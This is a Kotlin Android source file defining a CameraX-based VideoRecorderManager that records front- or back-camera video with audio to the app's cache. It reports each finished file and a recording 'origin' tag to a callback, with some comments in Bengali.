package com.kashem.shaikh.telegram

import android.content.Context
import android.util.Log
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.*
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import java.io.File
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class VideoRecorderManager(
    private val context: Context,
    private val lifecycleOwner: LifecycleOwner,
    private val onVideoRecorded: (File, String) -> Unit  // 🆕 অরিজিন প্যারামিটার
) {
    private var cameraProvider: ProcessCameraProvider? = null
    private var videoCapture: VideoCapture<Recorder>? = null
    private var recording: Recording? = null
    private var isRecording = false
    private var currentVideoFile: File? = null
    private var currentOrigin: String = "user"  // 🆕
    private val cameraExecutor: ExecutorService = Executors.newSingleThreadExecutor()

    fun startRecording(isFront: Boolean, origin: String = "user") {
        if (isRecording) {
            Log.d("VideoRecorder", "Already recording")
            return
        }
        currentOrigin = origin
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        cameraProviderFuture.addListener({
            cameraProvider = cameraProviderFuture.get()
            bindCameraUseCases(isFront)
        }, ContextCompat.getMainExecutor(context))
    }

    private fun bindCameraUseCases(isFront: Boolean) {
        val provider = cameraProvider ?: return

        val lensFacing = if (isFront) CameraSelector.LENS_FACING_FRONT else CameraSelector.LENS_FACING_BACK
        val cameraSelector = CameraSelector.Builder()
            .requireLensFacing(lensFacing)
            .build()

        val recorder = Recorder.Builder()
            .setQualitySelector(QualitySelector.from(Quality.HIGHEST))
            .build()
        videoCapture = VideoCapture.withOutput(recorder)

        try {
            provider.unbindAll()
            provider.bindToLifecycle(
                lifecycleOwner,
                cameraSelector,
                videoCapture
            )
            startRecordingInternal()
        } catch (exc: Exception) {
            Log.e("VideoRecorder", "Use case binding failed", exc)
        }
    }

    private fun startRecordingInternal() {
        val vc = this.videoCapture ?: return

        val outputDir = File(context.cacheDir, "videos")
        if (!outputDir.exists()) outputDir.mkdirs()

        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(System.currentTimeMillis())
        currentVideoFile = File(outputDir, "video_$timestamp.mp4")

        val outputOptions = FileOutputOptions.Builder(currentVideoFile!!).build()

        recording = vc.output
            .prepareRecording(context, outputOptions)
            .apply {
                withAudioEnabled()
            }
            .start(ContextCompat.getMainExecutor(context)) { recordEvent ->
                when (recordEvent) {
                    is VideoRecordEvent.Start -> {
                        isRecording = true
                        Log.d("VideoRecorder", "Recording started")
                    }
                    is VideoRecordEvent.Finalize -> {
                        isRecording = false
                        val file = currentVideoFile
                        if (recordEvent.hasError()) {
                            Log.e("VideoRecorder", "Recording error: ${recordEvent.error}")
                            file?.delete()
                        } else {
                            file?.let { onVideoRecorded(it, currentOrigin) }  // অরিজিন পাস
                        }
                        currentVideoFile = null
                        recording = null
                        cameraProvider?.unbindAll()
                        cameraProvider = null
                        this@VideoRecorderManager.videoCapture = null
                    }
                    else -> {}
                }
            }
    }

    fun stopRecording() {
        if (!isRecording) {
            Log.d("VideoRecorder", "No active recording")
            return
        }
        recording?.stop()
        recording = null
    }

    fun release() {
        stopRecording()
        cameraProvider?.unbindAll()
        cameraExecutor.shutdown()
    }
}